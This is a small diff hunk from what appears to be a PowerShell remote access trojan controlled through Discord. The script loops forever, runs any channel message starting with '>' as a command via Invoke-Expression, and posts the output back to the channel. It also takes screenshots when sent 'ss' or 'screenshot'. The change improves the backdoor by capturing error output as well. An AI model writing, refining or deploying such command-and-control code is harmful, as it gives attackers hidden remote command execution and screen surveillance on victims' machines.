@@ -72,7 +72,7 @@ while ($true) {
             
             if ($content -match "^>") {
                 $command = $content.Substring(1).Trim()
-                $response = Invoke-Expression -Command $command
+                $response = Invoke-Expression -Command "$command 2>&1" | Out-String
                 Send-DiscordMessage -channelID $channel.id -content "Results of `$command: `n``````$response``````"
             } elseif ($content -eq "ss" -or $content -eq "screenshot") {
                 $path = Get-Screenshot
